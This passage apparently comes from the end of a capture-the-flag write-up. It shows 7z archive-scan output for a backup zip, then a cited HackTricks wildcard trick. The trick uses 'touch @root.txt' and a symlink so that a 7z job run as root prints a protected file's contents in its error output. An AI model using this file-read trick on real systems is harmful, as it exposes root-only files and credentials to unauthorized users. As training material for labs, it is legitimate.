Path = /var/backups/project.zip
Type = zip
Physical Size = 54851331

Scanning the drive:
          
WARNING: No more files
0e99.....4e1b

2984 folders, 17981 files, 114323032 bytes (110 MiB)                         
```

## References
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when 7z is execute, it will treat root.txt as a file containing the list of files it should compress (thats what the existence of @root.txt indicates) and when it 7z read root.txt it will read /file/you/want/to/read and as the content of this file isn't a list of files, it will throw and error showing the content.

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------
